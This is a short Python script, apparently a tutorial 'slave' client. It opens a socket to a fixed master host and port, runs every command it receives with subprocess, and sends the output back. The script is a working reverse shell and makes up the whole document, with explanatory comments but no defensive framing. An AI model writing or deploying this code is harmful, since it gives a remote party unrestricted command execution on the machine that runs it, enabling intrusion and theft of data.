import socket
import subprocess

# Create socket with socket class.
slave = socket.socket()

# Host is the IP address of slave machine.
host = "10.0.0.3"

# This will be the port that master
# machine listens.
port = 34324

# connect to the master machine with connect
# command.
slave.connect((host, port))

while True:
    # receive the command from the master machine.
    # recv 1024 bytes from the master machine.
    command = slave.recv(1024).decode()
    print(command)

    # If the command is exit, close the connection.
    if command == "exit":
        break

    output  = "output:\n"

    # getoutput method executes the command and
    # returns the output.
    output += subprocess.getoutput(command)

    # Encode and send the output of the command to
    # the master machine.
    slave.send(output.encode())

# close method closes the connection.
slave.close()




